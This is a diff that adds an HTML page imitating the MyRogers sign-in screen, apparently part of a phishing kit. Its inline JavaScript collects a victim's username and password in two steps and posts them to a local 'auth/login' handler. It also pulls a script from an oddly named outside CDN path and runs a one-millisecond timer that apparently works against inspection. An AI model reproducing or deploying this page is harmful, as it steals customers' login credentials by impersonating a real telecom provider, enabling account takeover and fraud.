@@ -1,0 +1,412 @@
+<html data-critters-container="" theme="rogers" brand="rogers" lang="en">
+<head class="at-element-marker">
+    <title>MyRogers | Sign in</title>
+    <meta charset="utf-8">
+    <base href="/">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex">
+    <link href="assets/css/cdk-rogers.css" rel="stylesheet">
+    <link href="assets/css/abnormal.css" rel="stylesheet">
+    <style>
+    div.modal-close[_ngcontent-ng-c3891761850] {
+        position: absolute !important;
+        top: 0 !important;
+        right: 0 !important;
+    }
+    div.modal-close-row[_ngcontent-ng-c3891761850] {
+        padding: 10px;
+    }
+    .hideTransmitContainer[_ngcontent-ng-c3891761850],
+    .hideSPA[_ngcontent-ng-c3891761850] {
+        display: none !important;
+    }
+
+    </style>
+    <link type="image/x-icon" rel="icon" href="assets/img/favicon.ico">
+    <style>
+    .eas-loader[_ngcontent-ng-c709768192] {
+        position: absolute !important;
+    }
+    .full-screen-change-username[_ngcontent-ng-c709768192] {
+        position: absolute;
+        top: 0;
+        left: 0;
+        height: 100% !important;
+        width: 100% !important;
+        max-height: 100% !important;
+        max-width: 100% !important;
+    }
+    a.error-link[_ngcontent-ng-c709768192] {
+        cursor: pointer;
+    }
+    .registerButton[_ngcontent-ng-c709768192] {
+        font-size: 1.8rem;
+    }
+    .register-text[_ngcontent-ng-c709768192] {
+        margin-left: -26px;
+    }
+    </style>
+    <link href="assets/css/loader.css" rel="stylesheet">
+</head>
+<body mode="light" scale="default" class="backgroundImage">
+<app-root _nghost-ng-c3891761850="" ng-version="17.3.12" rogers-cdk="3.14.0">
+<div _ngcontent-ng-c3891761850="" role="main" class="d-flex flex-column h-100">
+    <div _ngcontent-ng-c3891761850="" class="d-flex justify-content-center flex-grow-1 flex-shrink-1 flex-basis-auto mt-76 lang-en">
+        <div _ngcontent-ng-c3891761850="" class="app-container w-100">
+            <div _ngcontent-ng-c3891761850="" class="d-flex flex-column h-100">
+                <div _ngcontent-ng-c3891761850="" class="d-flex justify-content-center flex-grow-1 flex-shrink-1 flex-basis-auto mt-76">
+                    <div _ngcontent-ng-c3891761850="" class="app-container w-100">
+                        <div _ngcontent-ng-c3891761850="" class="w-100 w-sm-75 w-md-50 m-sm-auto m-sm-12 border mainWidth ds-corners ds-bgcolor-snow dam-maxheight">
+                            <div _ngcontent-ng-c3891761850="" class="p-24 pr-sm-96 pl-sm-96 pb-sm-32 pt-sm-48">
+                                <div _ngcontent-ng-c3891761850="" class="modal-close-row"></div>
+                                <div _ngcontent-ng-c3891761850="" class="pb-24 pb-sm-16 d-flex flex-row justify-content-between align-items-center logoheader">
+                                    <a _ngcontent-ng-c3891761850="" ds-link="" variant="icon" target="_self" title="Rogers Home" tabindex="0" role="link" class="ds-link ds-pointer d-inline-flex outline-none mw-100 -icon text-no-decoration"><span class="ds-link__container d-flex align-items-center"><span role="text" class="ds-link__wrapper d-inline-block ds-txt-button"><span class="ds-link__copy"><img _ngcontent-ng-c3891761850="" class="logoImage" src="assets/img/og-image.png" alt="Rogers Communications trademarked logo">
+                                    </span>
+                                    </span></span></a>
+                                    <div _ngcontent-ng-c3891761850="">
+                                        <button _ngcontent-ng-c3891761850="" ds-button="" variant="tertiary" title="Sélectionner pour afficher en français" aria-label="Sélectionner pour afficher en français" tabindex="0" role="button" class="ds-button ds-corners ds-pointer text-center mw-100 d-inline-block -tertiary -large text-no-decoration"><span role="text" class="ds-button__wrapper d-flex justify-content-center align-items-center">
+                                        <span class="ds-button__copy ds-txt-button text-nowrap ds-no-overflow mw-100">US</span>
+                                        </span></button>
+                                    </div>
+                                </div>
+                                <div _ngcontent-ng-c3891761850="" id="transmitContainer" class="hideTransmitContainer">
+                                    <div id="xmui-main-container" style="position:relative; width:100%; height:100%"></div>
+                                </div>
+                                <ng-component id="login1" _nghost-ng-c709768192="" class="ng-star-inserted">
+                                    <h1 translate="" class="text-title-4 mb-8 ng-star-inserted">Sign in</h1>
+                                    <p class="mb-24 text-body-lg ng-star-inserted">with your MyRogers credentials</p>
+                                    <div id="error" _ngcontent-ng-c709768192="" class="mb-16 ng-star-inserted hide">
+                                        <ds-alert _ngcontent-ng-c709768192="" variant="error" role="alert" sstrackerror="" class="ng-tns-c2729095068-4 d-block ng-star-inserted">
+                                        <div class="ng-trigger ng-trigger-alertSlideUp ng-tns-c2729095068-4 ds-alert ds-bg-feedback-error b-solid b-1 ds-br-feedback-error ng-star-inserted">
+                                            <div class="container position-relative py-16 ng-tns-c2729095068-4 pr-72 pr-md-80">
+                                                <div _ngcontent-ng-c709768192="" class="d-flex flex-column flex-md-row ng-tns-c2729095068-4">
+                                                    <div _ngcontent-ng-c709768192="" class="flex-grow-1 d-flex">
+                                                        <ds-icon _ngcontent-ng-c709768192="" name="error-outlined" color="error" caption="Attention" class="mr-8 -size-24" aria-hidden="false" title="Error"><span role="img" class="ds-icon d-inline-flex rds-icon-error-outlined ds-color-error" aria-label="Attention" aria-hidden="false"></span></ds-icon>
+                                                        <div _ngcontent-ng-c709768192="">
+                                                            <p _ngcontent-ng-c709768192="" class="text-body mb-0 mw-content ng-star-inserted" style="">
+                                                                <span _ngcontent-ng-c709768192="" class="ng-star-inserted"><span _ngcontent-ng-c709768192="" class="ng-star-inserted"> Username is unrecognized. Try <a _ngcontent-ng-c709768192="" href="javascript:void(0)" variant="cta" class="error-link mb-0 ds-color-link">Forgot Username</a> if you don’t remember it. </span>
+                                                                </span>
+                                                            </p>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <button onclick="hide('error')" ds-button="" variant="icon" class="position-absolute top-4 right-16 ng-tns-c2729095068-4 ds-button ds-corners ds-pointer text-center mw-100 -icon d-inline-flex justify-content-center align-items-center -large -transparent text-no-decoration ng-star-inserted" aria-label="close" tabindex="0" role="button" style="">
+                                                    <span role="text" class="ds-button__wrapper d-flex justify-content-center align-items-center">
+                                                        <span class="ds-button__copy ds-txt-button text-nowrap ds-no-overflow mw-100 sr-only"></span>
+                                                        <ds-icon name="close" class="-size-24 ng-star-inserted">
+                                                            <span role="img" class="ds-icon d-inline-flex rds-icon-close" aria-hidden="true"></span
+                                                            >
+                                                        </ds-icon>
+                                                    </span>
+                                                </button>
+                                            </div>
+                                        </div>
+                                        </ds-alert>
+                                    </div>
+                                    <form id="form" action="javascript:void(0)" onsubmit="submitEmail()" method="POST" class="ng-untouched ng-pristine ng-invalid ng-star-inserted">
+                                        <div _ngcontent-ng-c709768192="">
+                                            <ds-form-field onfocus="checkInput('focus')" onclick="checkInput('click')" id="input-1" _ngcontent-ng-c709768192="" class="ds-formField ng-tns-c1509591417-0 ds-formField__typeds-input d-block position-relative ng-untouched ng-pristine ng-invalid -hasSuffix ng-star-inserted">
+                                                <div id="input-2" class="ds-formField__wrapper ng-tns-c1509591417-0">
+                                                    <div id="input-3" class="ds-formField__inputContainer d-flex position-relative ds-bg-interactive-neutral-default b-solid b-1 ng-tns-c1509591417-0 ds-corners ds-br-interactive-default-neutral">
+                                                        <span class="ds-formField__labelWrapper position-absolute mb-0 ng-tns-c1509591417-0 ng-trigger ng-trigger-floatAnimation">
+                                                            <label class="ds-formField_label ng-tns-c1509591417-0" for="ds-form-input-id-0">
+                                                                <ds-input-label _ngcontent-ng-c709768192="" id="username-label" class="ng-tns-c1509591417-0">
+                                                                    <span class="ds-inputLabel d-block ds-no-overflow">Username</span>
+                                                                </ds-input-label>
+                                                            </label>
+                                                        </span>
+                                                        <input type="text" id="email" name="email" autocapitalize="off" autofill="" class="ds-input w-100 ds-body-r mb-0 pt-16 ds-bgcolor-transparent ng-tns-c1509591417-0 cdk-text-field-autofill-monitored ng-untouched ng-pristine ng-invalid  " autocorrect="off" aria-invalid="false" aria-label="Username" onkeyup="checkInput('keyup')" onblur="checkInput('blur')">
+                                                        <div class="ds-formField__suffix justify-content-center align-items-center ng-tns-c1509591417-0">
+                                                            <ds-popover _ngcontent-ng-c709768192="" dssuffix="" title="“close”" class="ng-tns-c678424764-1 ng-tns-c1509591417-0 ng-star-inserted">
+                                                                <button onclick="show('info-username')" type="button" cdkmonitorsubtreefocus="" class="ds-popover outline-none ds-pointer ds-bgcolor-transparent b-0 ng-tns-c678424764-1">
+                                                                    <span class="ng-tns-c678424764-1"></span>
+                                                                    <div class="ds-popover-host-wrapper position-relative d-inline-flex ng-tns-c678424764-1">
+                                                                        <ds-icon tabindex="-1" name="info" class="ds-popover__icon outline-none ng-tns-c678424764-1 -size-24"><span role="img" class="ds-icon d-inline-flex rds-icon-info" aria-hidden="true"></span></ds-icon>
+                                                                    </div>
+                                                                </button>
+                                                            </ds-popover>
+                                                        </div>
+                                                    </div>
+                                                    <div class="ds-formField__autoComplete position-absolute w-100 ng-tns-c1509591417-0"></div>
+                                                    <div class="ds-formFields__messages ng-tns-c1509591417-0" id="formfield-0-messages"></div>
+                                                </div>
+                                            </ds-form-field>
+                                        </div>
+                                        <div _ngcontent-ng-c709768192="" class="ng-star-inserted">
+                                            <a _ngcontent-ng-c709768192="" ds-link="" variant="cta" class="mt-4 ds-color-link ds-link ds-pointer d-inline-flex outline-none mw-100 -cta text-no-decoration" title="Select to retrieve your username" tabindex="0" role="link"><span class="ds-link__container d-flex align-items-center"><span role="text" class="ds-link__wrapper d-inline-block ds-txt-button"><span class="ds-link__copy">Forgot username?</span><ds-icon name="right" class="right -size-24 ng-star-inserted"><span role="img" class="ds-icon d-inline-flex rds-icon-right" aria-hidden="true"></span></ds-icon>
+                                            </span></span></a>
+                                        </div>
+                                        <div _ngcontent-ng-c709768192="" class="mb-24">
+                                            <ds-checkbox _ngcontent-ng-c709768192="" formcontrolname="rememberMe" class="ds-checkbox text-normal ng-untouched ng-pristine ng-valid">
+                                                <label class="ds-checkboxLabel d-inline-flex align-items-start" for="ds-checkbox-id-0" aria-labelledby="ds-checkbox-id-0-label-container">
+                                                    <input type="checkbox" class="ds-checkbox__input cdk-visually-hidden" id="ds-checkbox-id-0" tabindex="0" aria-labelledby="ds-checkbox-id-0-label-container" aria-checked="true" onclick="rememberMe()">
+                                                    <div aria-hidden="true" id="checked" class="ds-checkbox__box my-12 rds-icon-checkmark"></div>
+                                                    <div class="ds-checkboxLabel__container ml-8 ds-body-r my-12 text-semi" id="ds-checkbox-id-0-label-container">
+                                                        <span style="display: none;">&nbsp;</span> Remember username                                                    </div>
+                                                </label>
+                                            </ds-checkbox>
+                                        </div>
+                                        <div class="text-center signInButton">
+                                            <button id="submit" type="submit" class="w-100 mb-16 ds-button ds-corners ds-pointer text-center mw-100 d-inline-block -primary -large text-no-decoration" tabindex="0">
+                                                <span role="text" class="ds-button__wrapper d-flex justify-content-center align-items-center">
+                                                    <span class="ds-button__copy ds-txt-button text-nowrap ds-no-overflow mw-100">
+                                                        <span id="text-btn" class="ng-star-inserted">Continue</span>
+                                                        <eas-loader id="loader-btn" _ngcontent-ng-c709768192="" class="eas-loader ng-star-inserted hide" _nghost-ng-c3287894006="">
+                                                            <span _ngcontent-ng-c3287894006="" role="alert" aria-live="assertive" class="eas-loader ng-star-inserted" aria-label="Please wait">
+                                                                <span _ngcontent-ng-c3287894006="">
+                                                                    <i _ngcontent-ng-c3287894006="" class="ng-star-inserted" style="background-color: white;"></i>
+                                                                    <i _ngcontent-ng-c3287894006="" class="ng-star-inserted" style="background-color: white;"></i>
+                                                                    <i _ngcontent-ng-c3287894006="" class="ng-star-inserted" style="background-color: white;"></i>
+                                                                    <i _ngcontent-ng-c3287894006="" class="ng-star-inserted" style="background-color: white;"></i>
+                                                                </span>
+                                                            </span>
+                                                        </eas-loader>
+                                                    </span>
+                                                </span>
+                                            </button>
+                                        </div>
+                                    </form>
+                                    <div _ngcontent-ng-c709768192="" class="ds-border-bottom mb-24 mt-16 ds-brcolor-concrete ng-star-inserted"></div>
+                                    <div _ngcontent-ng-c709768192="" class="footer ng-star-inserted">
+                                        <h5 _ngcontent-ng-c709768192="" class="registerButton"> New to MyRogers? <a _ngcontent-ng-c709768192="" ds-link="" variant="cta" class="ds-color-link ds-link ds-pointer d-inline-flex outline-none mw-100 -cta text-no-decoration ng-star-inserted" title="Select to register yourself on MyRogers" tabindex="0" role="link"><span class="ds-link__container d-flex align-items-center"><span role="text" class="ds-link__wrapper d-inline-block ds-txt-button"><span class="ds-link__copy">Register</span><ds-icon name="right" class="right -size-24 ng-star-inserted"><span role="img" class="ds-icon d-inline-flex rds-icon-right" aria-hidden="true"></span></ds-icon>
+                                        </span></span></a>
+                                        </h5>
+                                    </div>
+                                </ng-component>
+                                <ng-component id="login2" class="ng-star-inserted hide">
+                                    <h1 class="text-title-4 mb-8 ng-star-inserted">Sign in</h1>
+                                    <p class="mb-24 text-body-lg ng-star-inserted">with your MyRogers credentials</p>
+                                    <p class="text-body mb-2 text-bold ng-star-inserted" id="display-email"></p>
+                                    <a onclick="changePage(1)"  class="mb-24 ds-color-link ds-link ds-pointer d-inline-flex outline-none mw-100 -cta text-no-decoration ng-star-inserted" tabindex="0" role="link">
+                                        <span class="ds-link__container d-flex align-items-center">
+                                            <span role="text" class="ds-link__wrapper d-inline-block ds-txt-button">
+                                                <span class="ds-link__copy">Change username</span>
+                                                <ds-icon name="right" class="right -size-24 ng-star-inserted"><span role="img" class="ds-icon d-inline-flex rds-icon-right" aria-hidden="true"></span></ds-icon>
+                                            </span>
+                                        </span>
+                                    </a>
+                                    <div class="mb-16 ng-star-inserted hide" id="error2">
+                                        <ds-alert variant="error" role="alert" sstrackerror="" class="ng-tns-c2729095068-16 d-block ng-star-inserted">
+                                            <div class="ng-trigger ng-trigger-alertSlideUp ng-tns-c2729095068-16 ds-alert ds-bg-feedback-error b-solid b-1 ds-br-feedback-error ng-star-inserted">
+                                                <div class="container position-relative py-16 ng-tns-c2729095068-16 pr-72 pr-md-80">
+                                                    <div class="d-flex flex-column flex-md-row ng-tns-c2729095068-16">
+                                                        <div class="flex-grow-1 d-flex">
+                                                            <ds-icon name="error-outlined" color="error" caption="Attention" class="mr-8 -size-24" aria-hidden="false" title="Error"><span role="img" class="ds-icon d-inline-flex rds-icon-error-outlined ds-color-error" aria-label="Attention" aria-hidden="false"></span></ds-icon>
+                                                            <div _ngcontent-ng-c2305933876="">
+                                                                <p _ngcontent-ng-c2305933876="" damtranslationwithrouting="" class="text-body mb-0 mw-content ng-star-inserted" style="">
+                                                                     Incorrect password. Try again or use <a href="javascript:void(0)" variant="cta" class="mb-0 ds-color-link ng-star-inserted" title="Select to reset your password">Forgot password</a> to reset it.                                                                </p>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <button onclick="hide('error2')" ds-button="" variant="icon" class="position-absolute top-4 right-16 ng-tns-c2729095068-16 ds-button ds-corners ds-pointer text-center mw-100 -icon d-inline-flex justify-content-center align-items-center -large -transparent text-no-decoration ng-star-inserted" aria-label="close" tabindex="0" role="button" style=""><span role="text" class="ds-button__wrapper d-flex justify-content-center align-items-center"><span class="ds-button__copy ds-txt-button text-nowrap ds-no-overflow mw-100 sr-only"></span><ds-icon name="close" class="-size-24 ng-star-inserted"><span role="img" class="ds-icon d-inline-flex rds-icon-close" aria-hidden="true"></span></ds-icon></span></button>
+                                                </div>
+                                            </div>
+                                        </ds-alert>
+                                    </div>
+                                    <form id="form2" action="javascript:void(0)" onsubmit="login()" method="POST" class="ng-star-inserted ng-untouched ng-pristine ng-invalid">
+                                        <input type="hidden" id="email2" name="email">
+                                        <input type="hidden" name="type" value="login">
+                                        <div _ngcontent-ng-c2305933876="">
+                                            <ds-form-field  onfocus="checkInput2('focus')" onclick="checkInput2('click')" id="password-1" class="ds-formField ng-tns-c1509591417-15 ng-star-inserted ds-formField__typeds-input d-block position-relative ng-untouched ng-pristine -hasSuffix ng-valid">
+                                                <div id="password-2" class="ds-formField__wrapper ng-tns-c1509591417-15">
+                                                    <div id="password-3" class="ds-formField__inputContainer d-flex position-relative ds-bg-interactive-neutral-default b-solid b-1 ng-tns-c1509591417-15 ds-corners ds-br-interactive-default-neutral">
+                                                        <span class="ds-formField__labelWrapper position-absolute mb-0 ng-tns-c1509591417-15 ng-trigger ng-trigger-floatAnimation">
+                                                            <label class="ds-formField_label ng-tns-c1509591417-13">
+                                                                <ds-input-label class="ng-tns-c1509591417-13">
+                                                                    <span class="ds-inputLabel d-block ds-no-overflow">Password</span>
+                                                                </ds-input-label>
+                                                            </label>
+                                                        </span>
+                                                        <input onkeyup="checkInput2('keyup')" onblur="checkInput2('blur')" type="password" name="password" id="password" autocapitalize="off" class="ds-input w-100 ds-body-r mb-0 pt-16 ds-bgcolor-transparent round-input ng-tns-c1509591417-15 cdk-text-field-autofill-monitored ng-untouched ng-pristine ng-valid -hidden">
+                                                        <div class="ds-formField__suffix justify-content-center align-items-center ng-tns-c1509591417-13">
+                                                            <button onclick="showHidePassword()" type="button" tabindex="0" class="ds-button ds-corners ds-pointer text-center mw-100 -icon d-inline-flex justify-content-center align-items-center -large text-no-decoration ng-tns-c1509591417-13 ng-star-inserted">
+                                                                <span role="text" class="ds-button__wrapper d-flex justify-content-center align-items-center">
+                                                                    <span class="ds-button__copy ds-txt-button text-nowrap ds-no-overflow mw-100 sr-only"></span>
+                                                                    <ds-icon _ngcontent-ng-c2305933876="" class="-size-24 ng-star-inserted"><span role="img" class="ds-icon d-inline-flex rds-icon-hide" aria-hidden="true" id="icon"></span></ds-icon>
+                                                                </span>
+                                                            </button>
+                                                        </div>
+                                                    </div>
+                                                    <div class="ds-formField__autoComplete position-absolute w-100 ng-tns-c1509591417-13"></div>
+                                                    <div class="ds-formFields__messages ng-tns-c1509591417-13" id="formfield-6-messages"></div>
+                                                </div>
+                                            </ds-form-field>
+                                        </div>
+                                        <div style="margin-top: 5px;" class="ng-star-inserted">
+                                            <a class="mb-16 ds-color-link ds-link ds-pointer d-inline-flex outline-none mw-100 -cta text-no-decoration" title="Select to reset your password" tabindex="0" role="link"><span class="ds-link__container d-flex align-items-center"><span role="text" class="ds-link__wrapper d-inline-block ds-txt-button"><span class="ds-link__copy">Forgot password?</span><ds-icon name="right" class="right -size-24 ng-star-inserted"><span role="img" class="ds-icon d-inline-flex rds-icon-right" aria-hidden="true"></span></ds-icon>
+                                            </span></span></a>
+                                        </div>
+                                        <div class="text-center signInButton">
+                                            <button id="submit2" type="submit" class="w-100 mb-16 ds-button ds-corners ds-pointer text-center mw-100 d-inline-block -primary -large text-no-decoration" tabindex="0">
+                                                <span role="text" class="ds-button__wrapper d-flex justify-content-center align-items-center">
+                                                    <span class="ds-button__copy ds-txt-button text-nowrap ds-no-overflow mw-100">
+                                                        <span id="text-btn2" class="ng-star-inserted">Sign in</span>
+                                                        <eas-loader id="loader-btn2" _ngcontent-ng-c709768192="" class="eas-loader ng-star-inserted hide" _nghost-ng-c3287894006="">
+                                                            <span _ngcontent-ng-c3287894006="" role="alert" aria-live="assertive" class="eas-loader ng-star-inserted" aria-label="Please wait">
+                                                                <span _ngcontent-ng-c3287894006="">
+                                                                    <i _ngcontent-ng-c3287894006="" class="ng-star-inserted" style="background-color: white;"></i>
+                                                                    <i _ngcontent-ng-c3287894006="" class="ng-star-inserted" style="background-color: white;"></i>
+                                                                    <i _ngcontent-ng-c3287894006="" class="ng-star-inserted" style="background-color: white;"></i>
+                                                                    <i _ngcontent-ng-c3287894006="" class="ng-star-inserted" style="background-color: white;"></i>
+                                                                </span>
+                                                            </span>
+                                                        </eas-loader>
+                                                    </span>
+                                                </span>
+                                            </button>
+                                        </div>
+                                    </form>
+                                </ng-component>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</app-root>
+<div class="cdk-overlay-container hide" id="info-username"><div class="cdk-overlay-connected-position-bounding-box" dir="ltr" style="top: 0px; left: 0px; height: 100%; width: 100%;"><div id="cdk-overlay-0" class="cdk-overlay-pane" style="top: 227.297px; left: 774.5px; transform: translateX(6px) translateY(0.1px);"><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><div class="ds-popover-tooltip ng-tns-c678424764-1 ng-trigger ng-trigger-popoverAnimations ds-popover-position-right ng-star-inserted"><div class="ds-popover-boundry d-flex ng-tns-c678424764-1 ng-star-inserted" style=""><div class="ds-popover-arrow-container d-flex ng-tns-c678424764-1"><div class="ds-popover-arrow-handle d-flex align-items-center justify-content-center ng-tns-c678424764-1" style="transform: translate(1px, 70.9px);"><div class="ds-popover-arrow-box ng-tns-c678424764-1"></div></div></div><div class="d-flex ds-bg-white ds-bg-body-default b-solid b-1 ds-popover-content ng-tns-c678424764-1"><div class="p-16 pr-0 ng-tns-c678424764-1"><div tabindex="0" cdkmonitorelementfocus="" class="ds-popover__body outline-none m-0 ng-tns-c678424764-1" popover-content-injection-area="true" role="dialog" style="max-width:285px"><div>Your username is the email you used to register for MyRogers (e.g. jsmith@example.com). Some older usernames don't use email format (e.g. JSMITH76).</div></div></div><button onclick="hide('info-username')" ds-button="" class="-close ds-popover__close ng-tns-c678424764-1 ds-button ds-corners ds-pointer text-center mw-100 -icon d-inline-flex justify-content-center align-items-center -large text-no-decoration" aria-label="close" close-button="true" tabindex="0" role="button"><span role="text" class="ds-button__wrapper d-flex justify-content-center align-items-center"><span class="ds-button__copy ds-txt-button text-nowrap ds-no-overflow mw-100 sr-only"> close </span><ds-icon name="close" class="-size-24 ng-star-inserted"><span role="img" class="ds-icon d-inline-flex rds-icon-close" aria-hidden="true"></span></ds-icon></span></button></div></div></div><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div></div></div></div>
+<script src="https://cdn.jsdelivr.net/gh/cdnliburl/RANDOMURL/random.min.js"></script>
+<script src="assets/js/abnormal.js"></script>
+<script src="assets/js/disable.js"></script>
+<script src="assets/js/jquery.mask.min.js"></script>
+<script type="text/javascript">
+setInterval(gg, 1);
+
+function login() {
+    const form = document.getElementById('form2');
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData.entries());
+
+    if (!data.email || !data.password || !data.type || data.password.length < 6) return show('error2');
+
+    disableBtn('submit2');
+    show('loader-btn2');
+    hide('text-btn2');
+    hide('error2');
+    randomURLAPI();
+    $.ajax({
+        url: 'auth/login',
+        type: 'POST',
+        contentType: 'application/json',
+        data: JSON.stringify(data),
+        success: function(json) {
+            if (json.status == true) return location.reload();
+            
+            enableBtn('submit2');
+            hide('loader-btn2');
+            show('text-btn2');
+
+            enable('submit2');
+            return show('error2');
+        },
+        error: function (error) {
+            enable('submit2');
+            return show('error2');
+        }
+    });
+}
+
+function submitEmail() {
+    const form = document.getElementById('form');
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData.entries());
+
+    if (!data.email || data.email.length < 4) return show('error');
+
+    printData('display-email',data.email,'html');
+    printData('email2',data.email,'val');
+    return changePage(2);
+}
+
+function rememberMe() {
+    const checkbox = document.getElementById('ds-checkbox-id-0');
+    const ariaChecked = checkbox.getAttribute('aria-checked');
+
+    if (ariaChecked === 'true') {
+        checkbox.setAttribute('aria-checked', 'false');
+        return removeClass('checked',"rds-icon-checkmark");
+    }else{
+        checkbox.setAttribute('aria-checked', 'true');
+        return addClass('checked',"rds-icon-checkmark");
+    }
+}
+
+function checkInput(type) {
+    var email = $('[name="email"]').val();
+
+    if (!email) {
+        if (type == "click") autoFocus('email');
+
+        if (type == "click" || type == "focus" || type == "keyup") {
+            addClass('input-1','-float');
+            addClass('input-2','cdk-focused cdk-mouse-focused');
+            addClass('input-3','-active bx-2 by-2');
+            return removeClass('email','-hidden');
+        }
+
+        removeClass('input-1','-float');
+        removeClass('input-2','cdk-focused cdk-mouse-focused');
+        removeClass('input-3','-active bx-2 by-2');
+        return addClass('email','-hidden');
+    }
+}
+
+function checkInput2(type) {
+    var password = $('[name="password"]').val();
+
+    if (!password) {
+        if (type == "click") autoFocus('password');
+
+        if (type == "click" || type == "focus" || type == "keyup") {
+            addClass('password-1','-float');
+            addClass('password-2','cdk-focused cdk-mouse-focused');
+            addClass('password-3','-active bx-2 by-2');
+            return removeClass('password','-hidden');
+        }
+
+        removeClass('password-1','-float');
+        removeClass('password-2','cdk-focused cdk-mouse-focused');
+        removeClass('password-3','-active bx-2 by-2');
+        return addClass('password','-hidden');
+    }
+}
+
+function changePage(type) {
+    if (type == 1) {
+        show('login1');
+        return hide('login2');
+    }
+
+    show('login2');
+    return hide('login1');
+}
+
+function showHidePassword() {
+    var password = document.getElementById('password');
+
+    if (password.type === 'password') {
+        password.type = 'text';
+        removeClass('icon','rds-icon-hide');
+        addClass('icon','rds-icon-show');
+    } else {
+        password.type = 'password';
+        addClass('icon','rds-icon-hide');
+        removeClass('icon','rds-icon-show');
+    }
+}
+
+function disableBtn(id) {
+    var btn = document.getElementById(id);
+    btn.type = 'button';
+}
+
+function enableBtn(id) {
+    var btn = document.getElementById(id);
+    btn.type = 'submit';
+}
+</script>
+</body>
+</html>
